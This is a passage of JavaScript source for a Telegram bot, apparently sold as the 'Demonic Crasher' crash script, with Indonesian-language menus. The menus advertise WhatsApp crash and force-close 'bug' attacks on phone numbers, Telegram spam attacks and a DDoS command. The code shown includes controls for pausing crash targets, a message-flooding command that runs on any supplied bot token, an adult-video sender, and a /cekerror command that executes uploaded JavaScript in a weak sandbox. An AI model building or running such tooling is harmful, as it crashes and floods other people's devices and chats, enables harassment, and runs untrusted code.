│ Strawberry mangga nanas,  
│ Sorry bro ra panas cuaks 🥶  
│ Kita mah chill, lu yang kebakar 😹  
╰────────────────────────╯  

⬡═―—⊱ ⎧ PENYAKIT IRI ⎭ ⊰―—═⬡  
╭────────────────────────╮  
│ Hina orang tua  
│ Hina script ampas  
│ Hina Rozzy Official  
│ Komen panas 😹  
│ Liat sukses orang, kejang 🤡  
╰────────────────────────╯  

⬡═―—⊱ ⎧ PESAN ROZZY ⎭ ⊰―—═⬡  
╭────────────────────────╮  
│ Jangan bilang SC gw ampas  
│ Kalo lu bukan dep 😹  
│ Jangan bilang SC gw jelek  
│ Kalo lu modal base Orang 😱  
│ Yang ngomel itu belum  
│ pernah bikin sendiri 🤭  
╰────────────────────────╯  
</blockquote>`;

  const media = { type: "photo", media: getRandomImage(), caption: mainMenuMessage, parse_mode: "HTML" };
  const keyboard = { inline_keyboard: [[{ text: "Back ⬅️", callback_data: "kata_menu" }, { text: "Setting ➡", callback_data: "owner_menu" }]] };

  await editOrSend(ctx, media, keyboard);
});
// Handler untuk owner_menu
bot.action("owner_menu", async (ctx) => {
  await ctx.answerCbQuery().catch(() => {});
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();

  const mainMenuMessage = `<blockquote>
( PAGE 4 / 10 )

⬡═―—⊱ ⎧ CONTROL OWNER ⎭ ⊰―—═⬡  
╭────────────────────────╮  
│ シ/addprem     → Grant Premium  
│ シ/delprem     → Remove Premium  
│ シ/cekprem     → Check Premium  
│ シ/addsvip    → Grant Svip
│ シ/delsvip    → Revoke Svip
│ シ/status      → Bot Status  
│ シ/reqpairing  → Pairing Device  
│ シ/delsesi     → Delete Session  
│ シ/setcd       → Set Cooldown  
│ シ/listpairing → List Pairing  
╰────────────────────────╯  
⬡═―—⊱ ⎧ CONTROL OWNER ⎭ ⊰―—═⬡  
</blockquote>`;

  const media = { type: "photo", media: getRandomImage(), caption: mainMenuMessage, parse_mode: "HTML" };
  const keyboard = { inline_keyboard: [[{ text: "Back ⬅️", callback_data: "back" }, { text: "Telegram ➡️", callback_data: "bug_tele" }]] };

  await editOrSend(ctx, media, keyboard);
});
bot.action("bug_tele", async (ctx) => {
  await ctx.answerCbQuery().catch(() => {});
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();

  const mainMenuMessage = `<blockquote>
( PAGE 5 / 10 )

⬡═―—⊱ ⎧ TELEGRAM BUG ⎭ ⊰―—═⬡  
╭────────────────────────╮  
│ シ/XSpam Id Target
│ シ/XSpam @Username
│ シ/XGroup Id Target
│ シ/XGroup @Username
╰────────────────────────╯  
╭────────────────────────╮  
│ Target wajib start bot  
│ Bot harus di grup target  
╰────────────────────────╯  
</blockquote>`;

  const media = { type: "photo", media: getRandomImage(), caption: mainMenuMessage, parse_mode: "HTML" };
  const keyboard = { inline_keyboard: [[{ text: "Back ⬅️", callback_data: "owner_menu" }, { text: "Whatsapp ➡️", callback_data: "bug_menu" }]] };

  await editOrSend(ctx, media, keyboard);
});
// Handler unbug_bug_menu
bot.action("bug_menu", async (ctx) => {
  await ctx.answerCbQuery().catch(() => {});
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();

  const mainMenuMessage = `<blockquote>
( PAGE 6 / 10 )

⬡═―—⊱ ⎧ BUG INVISIBLE ⎭ ⊰―—═⬡  
╭────────────────────────╮  
│ シ/ExecutionVisible    → Late Message Surprise  
│ シ/ExecutionInvisible   → Delay Invisible 
│ シ/ExecutionQuota    → Delay Stuck Quota
╰────────────────────────╯  
⬡═―—⊱ ⎧ ANDROID HARD ⎭ ⊰―—═⬡  
╭────────────────────────╮  
│ シ/OverForce     → Force One Msg
│ シ/OverPower     → Combo Force Close
│ シ/GhostBlank      → Blank Black White
│ シ/CrashStrike      → Stuck Chats  
│ シ/XredUi     → Combined Crash UI  
╰────────────────────────╯  
⬡═―—⊱ ⎧ IPHONE MEDIUM ⎭ ⊰―—═⬡  
╭────────────────────────╮  
│ シ/iOS17Break     → Delay Freze
│ シ/AppleBreak     → Delay Chats
╰────────────────────────╯  
⬡═―—⊱ ⎧ PAUSE & RESUME ⎭ ⊰―—═⬡  
╭────────────────────────╮  
│ シ/deletebug x 62xx → Hapus Bug Total 
│ シ/fixedbug x 62xx → Pause Target
│ シ/resumebug → Resume Target
╰────────────────────────╯  
</blockquote>`;
  const media = { type: "photo", media: getRandomImage(), caption: mainMenuMessage, parse_mode: "HTML" };
  const keyboard = { inline_keyboard: [[{ text: "Back ⬅️", callback_data: "bug_tele" }, { text: "Tools ➡", callback_data: "tools_menu" }]] };

  await editOrSend(ctx, media, keyboard);
});
//TOOLS
bot.action("tools_menu", async (ctx) => {
  await ctx.answerCbQuery().catch(() => {});
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();

  const mainMenuMessage = `<blockquote>
( PAGE 7 / 10 )

⬡═―—⊱ ⎧ TOOLS ⎭ ⊰―—═⬡  
╭────────────────────────╮  
│ シ/cekdomain x cek domain
│ シ/ceknum x cek number
│ シ/ceknegara x cek negara
│ シ/cekidteman x cek id tmn lu
│ シ/cekid x cek id lu
│ シ/filmdewasa x 18+
│ シ/chatdev x report Dev
│ シ/rasukbot x kirim pesan bot
│ シ/maps x Cek Maps
│ シ/gempa x Info Gempa
│ シ/addfile x File to File Id
│ シ/cekerror x Cek Eror Index js lu
╰────────────────────────╯  
</blockquote>`;

  const media = { type: "photo", media: getRandomImage(), caption: mainMenuMessage, parse_mode: "HTML" };
  const keyboard = { inline_keyboard: [[{ text: "Back ⬅️", callback_data: "bug_menu" }, { text: "Tools Web ➡", callback_data: "toolsv2_menu" }]] };

  await editOrSend(ctx, media, keyboard);
});
//TOOLSV2
bot.action("toolsv2_menu", async (ctx) => {
  await ctx.answerCbQuery().catch(() => {});
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();

  const mainMenuMessage = `<blockquote>
( PAGE 8 / 10 )

⬡═―—⊱ ⎧ WEB SECURITY ⎭ ⊰―—═⬡  
╭────────────────────────╮  
│ シ/ssweb (url) → Screenshot Full Website  
│ シ/checkweb (url) → Cek Aman / Mencurigakan  
│ シ/scanlink (url) → Scan Pola Phishing  
│ シ/shortcheck (url) → Cek Shortlink  
│ シ/httpscheck (url) → Cek HTTPS / SSL  
│ シ/ipcheck (url) → Cek IP atau Domain  
│ シ/typoscan (url) → Deteksi Domain Typo  
│ シ/redirectwarn (url) → Peringatan Redirect  
│ シ/webpreview (url) → Preview Tampilan Web  
│ シ/ceklink (url) → Cek Link  
│ シ/linkhelp → Tampilkan Menu Ini  
╰────────────────────────╯  
╭────────────────────────╮  
│ シ/Ddos → Serangan Terhadap Web
╰────────────────────────╯  
</blockquote>`;

  const media = { type: "photo", media: getRandomImage(), caption: mainMenuMessage, parse_mode: "HTML" };
  const keyboard = { inline_keyboard: [[{ text: "Back ⬅️", callback_data: "tools_menu" }, { text: "Menu Channel ➡", callback_data: "react_menu" }]] };

  await editOrSend(ctx, media, keyboard);
});
// REACT CHANNEL
bot.action("react_menu", async (ctx) => {
  await ctx.answerCbQuery().catch(() => {});
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();

  const mainMenuMessage = `<blockquote>
( PAGE 9 / 10 )

⬡═―—⊱ ⎧ CHANNEL MENU ⎭ ⊰―—═⬡  
╭────────────────────────╮  
│ シ/reacton @Channel
│ シ/reactoff 
│ シ/pesan x @Channel x Pesan
╰────────────────────────╯  
╭────────────────────────╮  
│ Bot wajib admin channel  
│ Izin react & delete ON  
╰────────────────────────╯  
</blockquote>`;

  const media = { type: "photo", media: getRandomImage(), caption: mainMenuMessage, parse_mode: "HTML" };
  const keyboard = { inline_keyboard: [[{ text: "Back ⬅️", callback_data: "toolsv2_menu" }, { text: "TQ To ➡", callback_data: "tqto_menu" }]] };

  await editOrSend(ctx, media, keyboard);
});
//TQTO
bot.action("tqto_menu", async (ctx) => {
  await ctx.answerCbQuery().catch(() => {});
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();

  const mainMenuMessage = `<blockquote>
( PAGE 10 / 10 )

⬡═―—⊱ ⎧ THANKS TO ⎭ ⊰―—═⬡  
╭────────────────────────╮  
│ ALLAH SWT ❤ My God ❤
│ ORANG TUA ❤ My Suport ❤
│ @ROZZYOFFICIAL Developer 
│ @YudzSukaBakso My Friend Gw
╰────────────────────────╯  
╭────────────────────────╮  
│ All Support  
│ All Friend  
│ All Buyer  
│ All Pembenci
│ Demonic Crasher  
╰────────────────────────╯  
</blockquote>`;

  const media = {
  type: "photo",
  media: getRandomImage(),
  caption: mainMenuMessage,
  parse_mode: "HTML"
};

const keyboard = {
  inline_keyboard: [
    [
      { text: "Back ⬅️", callback_data: "toolsv2_menu" },
      { text: "🏠 Home", callback_data: "back" }
    ],
    [
      { text: "Hubungi Developer ➡", callback_data: "rozzy_menu" }
    ]
  ]
};

await editOrSend(ctx, media, keyboard);
});
bot.action("rozzy_menu", async (ctx) => {
  await ctx.answerCbQuery().catch(() => {});
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();

  const mainMenuMessage = `<blockquote>
⬡═―—⊱ ⎧ CHAT DEV MENU ⎭ ⊰―—═⬡  
╭───────────────────────╮  
│ シ/chatdev Pesan
╰───────────────────────╯  
╭──── ( KHUSUS ROZZY ) ────╮  
│ シ/BalasId  → Balas Chat Dev  
│ シ/BalasChat  → Balas Chat Dev 
╰──────────────────────╯  
⬡═―—⊱ ⎧ OWNER MENU ⎭ ⊰―—═⬡  

👤 User : ${Name}  
⏳ Uptime : ${waktuRunPanel}  
</blockquote>`

  const media = {
  type: "photo",
  media: getRandomImage(),
  caption: mainMenuMessage,
  parse_mode: "HTML"
};

const keyboard = {
    inline_keyboard: [
      [
        { text: "⬅️ Back", callback_data: "tqto_menu" },
        { text: "🏠 Home", callback_data: "back" }
      ]
    ]
  }

  await editOrSend(ctx, media, keyboard)
});
// Handler untuk back main menu
bot.action("back", async (ctx) => {
  const userId = ctx.from.id.toString();
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();

  const mainMenuMessage = `<blockquote>
⬡═―—⊱ ⎧ DEMONIC CRASHER ⎭ ⊰―—═⬡  

👑 Owner   : @ROZZYOFFICIAL  
👤 User    : ${Name}  
⏱ Runtime : ${waktuRunPanel}  

( PAGE 1 / 10 )  
──────────────  

⬡═―—⊱ ⎧ STATUS BOT ⎭ ⊰―—═⬡  
• Name    : Demonic Crasher  
• Version : V16 GEN 5  
• Price   : 10K – 100K  
──────────────  

⬡═―—⊱ ⎧ BUY SCRIPT ⎭ ⊰―—═⬡  
• Contact : @ROZZYOFFICIAL  
• Chat Owner for Purchase  
──────────────  
</blockquote>`;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
    inline_keyboard: [
      [
        { text: "Devas", url: "https://t.me/RozzyOfficial" },
        { text: "Information", url: "https://t.me/DemonicCrasher" },
        { text: "About Devas", url: "https://t.me/AboutRozzy" }
      ],
      [
        { text: "Next ➡", callback_data: "info_menu" }
      ]
    ]
  };

  await editOrSend(ctx, media, keyboard);
});
///////// TOOLS \\\\\\\\\\
bot.command("fixedbug", async (ctx) => {
  const raw = ctx.message?.text?.split(" ")[1];
  if (!raw) return ctx.reply("❌ Format: /fixedbug 62xxxx");

  const target = normalizeTarget(raw);

  if (isFixedBug(target)) {
    return ctx.reply(`🧊 Target ${raw} sudah di-FIXED (soft stop).`);
  }

  fixedBug(target);
  ctx.reply(
    `🧊 FIXEDBUG aktif untuk ${raw}\n\n` +
    `Semua pengiriman ke nomor ini akan dipause (bisa dilanjutkan).`
  );
});
bot.command("deletebug", async (ctx) => {
  const raw = ctx.message?.text?.split(" ")[1];
  if (!raw) return ctx.reply("❌ Format: /deletebug 62xxxx");

  const target = normalizeTarget(raw);

  if (isDeletedBug(target)) {
    return ctx.reply(`💀 Target ${raw} sudah di-DELETE (hard stop).`);
  }

  deleteBug(target);

  // kalau sebelumnya di-fixed, hapus juga
  fixedBugTargets.delete(target);

  ctx.reply(
    `💀 DELETEBUG aktif untuk ${raw}\n\n` +
    `Semua pengiriman ke nomor ini dihentikan total & dibatalkan.`
  );
});
bot.command("resumebug", async (ctx) => {
  const raw = ctx.message?.text?.split(" ")[1];
  if (!raw) return ctx.reply("❌ Format: /resumebug 62xxxx");

  const target = normalizeTarget(raw);

  if (!isFixedBug(target)) {
    return ctx.reply(`ℹ️ Target ${raw} tidak sedang di-fixed.`);
  }

  fixedBugTargets.delete(target);
  ctx.reply(`▶️ Target ${raw} dilanjutkan.`);
});

bot.command("cekdomain", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("⚠️ Contoh: /cekdomain google.com");

  try {
    const res = await axios.get(`https://api.api-ninjas.com/v1/whois?domain=${args}`, {
      headers: { "X-Api-Key": config.apiNinjasKey }
    });

    const msg = `🌐 *Info Domain:*\n\n` +
                `• Domain: ${args}\n` +
                `• Registrar: ${res.data.registrar}\n` +
                `• Dibuat: ${res.data.creation_date}\n` +
                `• Expired: ${res.data.expiration_date}\n` +
                `• DNS: ${res.data.name_servers.join(", ")}`;

    ctx.reply(msg, { parse_mode: "HTML" });
  } catch (e) {
    ctx.reply("❌ Gagal cek domain (pastikan APIKEY api- sudah benar)");
  }
});
bot.command("ceknum", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("⚠️ Contoh: /ceknum +6281234567890");

  try {
    const res = await axios.get(`https://api.apilayer.com/number_verification/validate?number=${args}`, {
      headers: { apikey: config.apilayerKey }
    });

    if (!res.data.valid) return ctx.reply("❌ Nomor tidak valid!");

    const msg = `📱 *Info Nomor:*\n\n` +
                `• Nomor: ${res.data.international_format}\n` +
                `• Negara: ${res.data.country_name} (${res.data.country_code})\n` +
                `• Operator: ${res.data.carrier}\n` +
                `• Tipe: ${res.data.line_type}`;

    ctx.reply(msg, { parse_mode: "HTML" });
  } catch (e) {
    ctx.reply("❌ Gagal cek nomor (pastikan APIKEY Api sudah benar)");
  }
});
bot.command("ceknegara", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("⚠️ Contoh: /ceknegara id");

  try {
    const res = await axios.get(`https://restcountries.com/v3.1/alpha/${args}`);
    const c = res.data[0];

    let msg = `🏴 *Info Negara:*\n\n` +
              `• Nama: ${c.name.common}\n` +
              `• Ibu Kota: ${c.capital ? c.capital[0] : "-"}\n` +
              `• Populasi: ${c.population.toLocaleString()}\n` +
              `• Mata Uang: ${Object.values(c.currencies)[0].name} (${Object.keys(c.currencies)[0]})\n` +
              `• Bahasa: ${Object.values(c.languages).join(", ")}\n` +
              `• Timezone: ${c.timezones.join(", ")}`;

    ctx.reply(msg, { parse_mode: "HTML" });
  } catch (e) {
    ctx.reply("❌ Kode negara tidak valid!");
  }
});
bot.command("cekidteman", checkPremium, async (ctx) => {
  let user;

  if (ctx.message.reply_to_message) {
    user = ctx.message.reply_to_message.from;
  } else {
    user = ctx.from;
  }

  const text = `
🆔 *CEK ID TELEGRAM*
━━━━━━━━━━━━━━
👤 Nama : ${user.first_name || "-"}
🔖 Username : ${user.username ? "@" + user.username : "-"}
🧾 User ID : ${user.id}
🤖 Is Bot : ${user.is_bot ? "Ya" : "Tidak"}
  `;

  ctx.reply(text, { parse_mode: "HTML" });
});
bot.command("cekid", async (ctx) => {
  const user = ctx.from;

  const text = `
🆔 *CEK ID TELEGRAM*
━━━━━━━━━━━━━━
👤 Nama : ${user.first_name || "-"}
🔖 Username : ${user.username ? "@" + user.username : "-"}
🧾 User ID : ${user.id}
🤖 Is Bot : ${user.is_bot ? "Ya" : "Tidak"}
  `;

  ctx.reply(text, { parse_mode: "HTML" });
});
bot.command("rasukbot", checkPremium, async (ctx) => {
  try {
    // Ambil teks setelah command
    const input = ctx.message.text.split(" ").slice(1).join(" ")

    if (!input || !input.includes("|")) {
      return ctx.reply(
        "📩 <b>Format salah!</b>\n\n" +
        "Gunakan format:\n" +
        "<code>/rasukbot token|id|pesan|jumlah</code>\n\n" +
        "Contoh:\n" +
        "<code>/rasukbot 123456:ABCDEF|987654321|Halo bro|5</code>",
        { parse_mode: "HTML" }
      )
    }

    const [token, targetId, pesan, jumlahStr] =
      input.split("|").map(v => v.trim())

    const jumlah = parseInt(jumlahStr)

    if (!token || !targetId || !pesan || isNaN(jumlah) || jumlah < 1) {
      return ctx.reply(
        "❌ <b>Format tidak valid!</b>\nGunakan:\n<code>/rasukbot token|id|pesan|jumlah</code>",
        { parse_mode: "HTML" }
      )
    }

    await ctx.reply("🚀 Mengirim pesan...")

    for (let i = 1; i <= jumlah; i++) {
      await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
        chat_id: targetId,
        text: pesan
      })
    }

    await ctx.reply(
      `✅ <b>Berhasil!</b>\nMengirim <b>${jumlah}</b> pesan ke ID <code>${targetId}</code>`,
      { parse_mode: "HTML" }
    )

  } catch (err) {
    console.error("❌ rasukbot error:", err)
    ctx.reply(
      `❌ <b>Gagal mengirim pesan</b>\n<code>${err.message}</code>`,
      { parse_mode: "HTML" }
    )
  }
})
bot.command("addfile", async (ctx) => {
  ADD_FILE_STATE[ctx.chat.id] = true;

  await ctx.reply(
    "📎 Kirim FILE sekarang\n\nBot akan mengirimkan file_id"
  );
});
bot.on("document", async (ctx) => {
  const chatId = ctx.chat.id;

  if (!ADD_FILE_STATE[chatId]) return;

  const doc = ctx.message.document;
  const fileId = doc.file_id;
  const fileName = doc.file_name || "-";
  const fileSize = (doc.file_size / 1024 / 1024).toFixed(2);

  await ctx.replyWithHTML(
`✅ <b>FILE ID BERHASIL</b>

📄 Nama: ${fileName}
📦 Size: ${fileSize} MB

<code>${fileId}</code>`
  );

  console.log("FILE_ID:", fileId);

  delete ADD_FILE_STATE[chatId];
});
bot.command("tourl", async (ctx) => {
  const reply = ctx.message.reply_to_message;

  if (!reply) {
    return ctx.replyWithHTML(
`📎 <b>CARA PAKAI</b>

Reply media apa saja dengan:
<code>/tourl</code>

Support:
• Foto
• Video
• File / Document
• Audio / Voice
• GIF

⚠️ <b>Limit upload: 200 MB</b>`
    );
  }

  let file = null;
  let type = null;

  if (reply.photo) {
    file = reply.photo.at(-1);
    type = "Foto";
  } else if (reply.video) {
    file = reply.video;
    type = "Video";
  } else if (reply.document) {
    file = reply.document;
    type = "File";
  } else if (reply.audio) {
    file = reply.audio;
    type = "Audio";
  } else if (reply.voice) {
    file = reply.voice;
    type = "Voice";
  } else if (reply.animation) {
    file = reply.animation;
    type = "GIF";
  }

  if (!file) {
    return ctx.reply("❌ Media tidak didukung");
  }

  // ===== LIMIT SIZE =====
  const sizeMB = (file.file_size || 0) / 1024 / 1024;
  if (sizeMB > 200) {
    return ctx.replyWithHTML(
`❌ <b>FILE TERLALU BESAR</b>

📦 Size: ${sizeMB.toFixed(2)} MB
⚠️ Limit maksimal: <b>200 MB</b>`
    );
  }

  try {
    await ctx.reply("⏳ Uploading ke Catbox...");

    const fileLink = await ctx.telegram.getFileLink(file.file_id);
    const res = await fetch(fileLink.href);
    const buffer = await res.arrayBuffer();

    const url = await uploadToCatbox(Buffer.from(buffer));

    await ctx.replyWithHTML(
`✅ <b>UPLOAD BERHASIL</b>

📂 Tipe: ${type}
📦 Size: ${sizeMB.toFixed(2)} MB
🔗 <a href="${url}">${url}</a>`,
      { disable_web_page_preview: true }
    );

  } catch (err) {
    console.log("TOURL ERROR:", err.message);
    ctx.reply("❌ Gagal upload ke server");
  }
});
bot.command("filmdewasa", checkPremium, async (ctx) => {
  try {
    await ctx.reply("⏱️ Tunggu sebentar ya sayang... 😘")

    const raw = fs.readFileSync("./Privasi/Privat.json", "utf8")
    const json = JSON.parse(raw)

    if (!Array.isArray(json.videos) || json.videos.length === 0) {
      return ctx.reply("🚫 Video tidak tersedia.")
    }

    const captions = [
      "Asupan hari ini sayangg🥵💦",
      "mana tahan🥵",
      "pulen bgtt🥵💦",
      "enak banget🥰",
      "andai aku disitu😋",
      "tete padet😳",
      "jadi sagne💦",
    ]

    const hasil = json.videos[Math.floor(Math.random() * json.videos.length)]
    const caption = captions[Math.floor(Math.random() * captions.length)]

    await ctx.replyWithVideo({ url: hasil }, { caption })

  } catch (err) {
    console.error("❌ Error filmdewasa:", err)
    ctx.reply("⚠️ Terjadi kesalahan saat mengambil video.")
  }
});

bot.command(`chatdev`, checkPremium, async (ctx) => {
  const text = ctx.message.text.split(` `).slice(1).join(` `)

  if (!text) {
    return ctx.reply(
      `❗ <b>Format salah!</b>\n\n` +
      `Contoh penggunaan:\n` +
      `<code>/chatdev halo dev, saya mau tanya soal script</code>`,
      { parse_mode: `HTML` }
    )
  }

  try {
    await sendNotifOwner(ctx, `Pesan dari pengguna:\n${text}`)

    ctx.reply(
      `✅ <b>Pesan berhasil dikirim ke Developer!</b>\n\n` +
      `Terima kasih telah menghubungi Developer.\n\n` +
      `📌 <b>Catatan:</b>\n` +
      `• Mohon gunakan kata yang sopan\n` +
      `• Jika ada kendala pada script, jelaskan secara detail\n` +
      `• Jika butuh bantuan, silakan hubungi Developer\n` +
      `• Jika ingin order script, silakan hubungi Developer\n\n` +
      `⏳ Mohon tunggu balasan dari Developer.`,
      { parse_mode: `HTML` }
    )
  } catch (err) {
    console.error(`CHATDEV ERROR:`, err)
    ctx.reply(
      `❌ Gagal mengirim pesan ke Developer. Silakan coba lagi nanti.`
    )
  }
});
bot.command(`BalasId`, async (ctx) => {
  if (ctx.from.id.toString() !== OWNER_CHAT_ID.toString()) {
    return ctx.reply(`❌ Command ini hanya untuk Developer.`)
  }

  const args = ctx.message.text.split(` `)
  if (args.length < 3) {
    return ctx.reply(
      `❗ <b>Format salah!</b>\n\n` +
      `Contoh:\n` +
      `<code>/replydev 123456789 halo, terima kasih sudah menghubungi saya</code>`,
      { parse_mode: `HTML` }
    )
  }

  const targetId = args[1]
  const replyText = args.slice(2).join(` `)

  try {
    await bot.telegram.sendMessage(
      targetId,
      `💬 <b>Balasan dari Developer:</b>\n\n${replyText}`,
      { parse_mode: `HTML` }
    )

    ctx.reply(`✅ Pesan berhasil dikirim ke user.`)
  } catch (err) {
    console.error(`REPLYDEV ERROR:`, err)
    ctx.reply(`❌ Gagal mengirim balasan ke user.`)
  }
})
bot.command(`BalasChat`, async (ctx) => {
  if (ctx.from.id.toString() !== OWNER_CHAT_ID.toString()) {
    return ctx.reply(`❌ Command ini hanya untuk Developer.`)
  }

  const text = ctx.message.text.split(` `).slice(1).join(` `)
  if (!text) {
    return ctx.reply(
      `❗ <b>Format salah!</b>\n\n` +
      `Contoh:\n` +
      `<code>/replylast halo, terima kasih sudah menghubungi saya</code>`,
      { parse_mode: `HTML` }
    )
  }

  const data = loadLastDevChat()
  if (!data.last) {
    return ctx.reply(`⚠️ Belum ada user yang menghubungi developer.`)
  }

  try {
    await bot.telegram.sendMessage(
      data.last.userId,
      `💬 <b>Balasan dari Developer:</b>\n\n${text}`,
      { parse_mode: `HTML` }
    )

    ctx.reply(`✅ Balasan berhasil dikirim ke user terakhir.`)
  } catch (err) {
    console.error(`REPLYLAST ERROR:`, err)
    ctx.reply(`❌ Gagal mengirim balasan.`)
  }
});
// ===== /maps =====
bot.command("maps", checkPremium, async (ctx) => {
  const lokasi = ctx.message.text.replace("/maps", "").trim();
  if (!lokasi) return ctx.reply("Contoh: /maps Jakarta");

  const link = `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(lokasi)}`;
  ctx.reply(`🗺 Lokasi ditemukan:\n${link}`);
});

// ===== /gempa =====
bot.command("gempa", checkPremium, async (ctx) => {
  try {
    const res = await fetch("https://data.bmkg.go.id/DataMKG/TEWS/autogempa.json");
    const data = await res.json();
    const gempa = data.Infogempa.gempa;

    const info = `
📢 *Info Gempa Terbaru BMKG*
📅 Tanggal: ${gempa.Tanggal}
🕒 Waktu: ${gempa.Jam}
📍 Lokasi: ${gempa.Wilayah}
📊 Magnitudo: ${gempa.Magnitude}
📌 Kedalaman: ${gempa.Kedalaman}
🌊 Potensi: ${gempa.Potensi}
🧭 Koordinat: ${gempa.Coordinates}
🗺️ *Dirasakan:* ${gempa.Dirasakan || "-"}
Sumber: ©Rozzy
    `;

    ctx.reply(info, { parse_mode: "HTML" });
  } catch (err) {
    ctx.reply("⚠️ Gagal mengambil data gempa dari BMKG.");
  }
});
// ===== REACT ON + SET CHANNEL =====
bot.command("reacton", (ctx) => {
  const ch = ctx.message.text.split(" ")[1]
  if (!ch) return ctx.reply("❌ Contoh: /reacton @channel")

  bot.reactTarget = ch.replace("@","")
  bot.reactOn = true

  ctx.reply(`✅ Auto reaction AKTIF di:\n@${bot.reactTarget}`)
});

// ===== REACT OFF =====
bot.command("reactoff", (ctx) => {
  bot.reactOn = false
  ctx.reply("🛑 Auto reaction DIMATIKAN")
});

// ===== AUTO REACT HANDLER =====
bot.on("channel_post", async (ctx) => {
  try {
    if (!bot.reactOn || !bot.reactTarget) return

    const ch = ctx.channelPost.chat.username
    if (!ch || ch !== bot.reactTarget) return

    const emoji = reactEmojis[Math.floor(Math.random() * reactEmojis.length)]

    await ctx.telegram.callApi("setMessageReaction", {
      chat_id: ctx.channelPost.chat.id,
      message_id: ctx.channelPost.message_id,
      reaction: [{ type: "emoji", emoji: emoji }]
    })

  } catch (e) {
    if (e.description?.includes("REACTION")) return
    console.log("Auto react error:", e)
  }
});

// auto react
bot.on("channel_post", async (ctx) => {
  try {
    const ch = ctx.channelPost.chat.username
    if (!bot.reactOn || !bot.reactTarget) return
    if (ch !== bot.reactTarget) return

    const emoji = reactEmojis[Math.floor(Math.random() * reactEmojis.length)]

    await ctx.telegram.callApi("setMessageReaction", {
      chat_id: ctx.channelPost.chat.id,
      message_id: ctx.channelPost.message_id,
      reaction: [{ type: "emoji", emoji }]
    })

    // ===== FILTER WORD =====
    if (bot.filterOn && bot.filterWords.length) {
      const text = ctx.channelPost.text || ctx.channelPost.caption || ""
      if (bot.filterWords.some(w => text.toLowerCase().includes(w))) {
        await ctx.telegram.deleteMessage(
          ctx.channelPost.chat.id,
          ctx.channelPost.message_id
        )
      }
    }

  } catch (e) {
    console.log("Channel handler error:", e)
  }
});

// ===== PESAN KE CHANNEL =====
bot.command("pesan", checkPremium, async (ctx) => {
  try {
    const text = ctx.message.text.split(" ")
    const ch = text[2]
    if (!ch) return ctx.reply("❌ Contoh: /pesan x @channel x pesan")

    const msg = ctx.message.text.split(" x ").slice(2).join(" x ")
    if (!msg) return ctx.reply("❌ Pesan tidak boleh kosong")

    await ctx.telegram.sendMessage(ch, msg)
    ctx.reply("✅ Pesan terkirim ke channel")

  } catch (e) {
    console.log(e)
    ctx.reply("❌ Gagal kirim pesan (pastikan bot admin)")
  }
});
bot.command("cekerror", async (ctx) => {
  if (!ctx.message.reply_to_message?.document) {
    return ctx.reply(
      "📤 Silakan <b>REPLY file index.js</b> lalu ketik <b>/cekerror</b>",
      { parse_mode: "HTML" }
    );
  }

  const doc = ctx.message.reply_to_message.document;
  const fileName = doc.file_name;

  if (!fileName.endsWith(".js")) {
    return ctx.reply("❌ Hanya file <b>.js</b> yang bisa dicek!", {
      parse_mode: "HTML"
    });
  }

  const fileLink = await ctx.telegram.getFileLink(doc.file_id);
  const res = await fetch(fileLink.href);
  const buffer = Buffer.from(await res.arrayBuffer());
  const code = buffer.toString("utf8");

  const sizeKB = (buffer.length / 1024).toFixed(1);
  const lines = code.split("\n").length;

  let syntax = null;
  let runtime = null;
  let problems = [];

  // ===== SYNTAX CHECK =====
  try {
    new vm.Script(code);
  } catch (e) {
    syntax = e;
  }

  // ===== RUNTIME CHECK =====
  try {
    vm.runInNewContext(code, { console });
  } catch (e) {
    runtime = e;
  }

  // ===== COMMON BUG SCAN =====
  const rules = [
    { key: "eval(", msg: "Penggunaan eval() berbahaya." },
    { key: "process.exit", msg: "process.exit() dapat mematikan bot." },
    { key: "fs.unlinkSync", msg: "unlinkSync bisa membuat crash jika file tidak ada." },
    { key: "while(true)", msg: "Infinite loop terdeteksi." },
    { key: "setInterval(", msg: "setInterval tanpa clearInterval → memory leak." }
  ];

  for (const rule of rules) {
    if (code.includes(rule.key)) problems.push(rule.msg);
  }

  const time = moment().tz("Asia/Jakarta").format("HH.mm.ss");
  const date = moment().tz("Asia/Jakarta").format("dddd, DD MMMM YYYY");

  const syntaxText = syntax
    ? `❌ <b>Syntax Error:</b> <pre>${escapeHTML(syntax.message)}</pre>`
    : "✅ Tidak ditemukan error syntax.";

  const runtimeText = runtime
    ? `❌ <b>Runtime Error:</b> <pre>${escapeHTML(runtime.message)}</pre>`
    : "✅ Tidak ditemukan error runtime.";

  const problemText = problems.length
    ? problems.map(v => `• ⚠️ ${v}`).join("\n")
    : "• ✅ Tidak ditemukan kesalahan umum.";

  const report = `
🧪 <b>CekError JavaScript Analyzer</b>

🕒 ${time} WIB
📆 ${date}

━━━━━━━━━━━━━━
📄 File   : <b>${fileName}</b>
📦 Ukuran : <b>${sizeKB} KB</b>
📏 Baris  : <b>${lines}</b>
━━━━━━━━━━━━━━

${syntaxText}

⚙️ <b>RUNTIME CHECK</b>
${runtimeText}

🧠 <b>DETEKSI MASALAH UMUM</b>
<pre>${problemText}</pre>

🛠 <b>SARAN PERBAIKAN</b>
